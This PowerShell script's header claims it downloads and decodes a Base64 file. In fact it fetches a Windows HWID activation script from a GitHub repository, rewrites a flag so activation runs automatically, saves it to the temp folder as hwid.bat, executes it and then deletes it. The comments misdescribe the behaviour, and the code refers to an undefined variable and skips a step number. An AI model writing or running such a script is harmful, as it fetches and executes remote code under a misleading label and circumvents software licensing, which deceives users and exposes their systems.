# =============================================================================
# Script: Download and Decode File
# Description: This script downloads a Base64 encoded file from a URL,
#              decodes it, and saves the content to a new file.
# =============================================================================

# --- Configuration ---
# Use variables to make the script easy to update.
$url = "https://github.com/massgravel/Microsoft-Activation-Scripts/raw/refs/heads/master/MAS/Separate-Files-Version/Activators/HWID_Activation.cmd"
$tempDir = $env:TEMP # The temporary directory path
$decodedFile = Join-Path -Path $tempDir -ChildPath "hwid.bat"

# --- Main Logic ---
try {
    # Step 1: Set modern security protocol for web requests
    # This is necessary for connecting to sites like GitHub.
    Write-Host "Setting security protocol to TLS 1.2..."
    [Net.ServicePointManager]::SecurityProtocol = 'tls12'

    # Step 2: Download the Base64 file
    Write-Host "Downloading file from URL: $url"
    $webClient = New-Object Net.WebClient
	$script = $webClient.DownloadString($url).Replace('set _act=0', 'set _act=1');
    Write-Host "File successfully downloaded to: $downloadedFile"

    # Step 4: Save the decoded content to the destination file
    [System.IO.File]::WriteAllText($decodedFile, $script)
    Write-Host "✅ Success! Decoded file saved to: $decodedFile"
}
catch {
    # If any command in the 'try' block fails, this will run.
    Write-Error "❌ An error occurred:"
    Write-Error $_ # The $_ variable contains the specific error message.
    exit 1 # Exit the script with an error code.
}

cmd /c call %temp%\hwid.bat
cmd /c del %temp%\hwid.bat